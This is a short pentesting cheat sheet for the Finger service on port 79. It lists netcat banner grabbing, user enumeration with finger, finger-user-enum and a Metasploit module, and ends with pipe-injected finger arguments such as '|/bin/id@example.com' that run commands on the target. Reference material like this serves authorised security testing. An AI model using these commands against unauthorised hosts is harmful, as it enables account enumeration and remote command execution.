# 79 - Pentesting Finger

 

## **Basic Info**

**Finger** is a program you can use to find information about computer users. It usually lists the login name, the full name, and possibly other details about the user you are fingering. These details may include the office location and phone number (if known), login time, idle time, time mail was last read, and the user's plan and project files.

**Default port:** 79

```
PORT   STATE SERVICE
79/tcp open  finger
```

## **Enumeration**

### **Banner Grabbing/Basic connection**

```bash
nc -vn <IP> 79
echo "root" | nc -vn <IP> 79
```

### **User enumeration**

```bash
finger @<Victim>       #List users
finger admin@<Victim>  #Get info of user
finger user@<Victim>   #Get info of user
```

Alternatively you can use **finger-user-enum** from [**pentestmonkey**](http://pentestmonkey.net/tools/user-enumeration/finger-user-enum), some examples:

```bash
finger-user-enum.pl -U users.txt -t 10.0.0.1
finger-user-enum.pl -u root -t 10.0.0.1
finger-user-enum.pl -U users.txt -T ips.txt
```

#### **Nmap execute a script for doing using default scripts**

### Metasploit uses more tricks than Nmap

```
use auxiliary/scanner/finger/finger_users
```

### Shodan

* `port:79 USER`

## Command execution

```bash
finger "|/bin/id@example.com"
finger "|/bin/ls -a /@example.com"
```
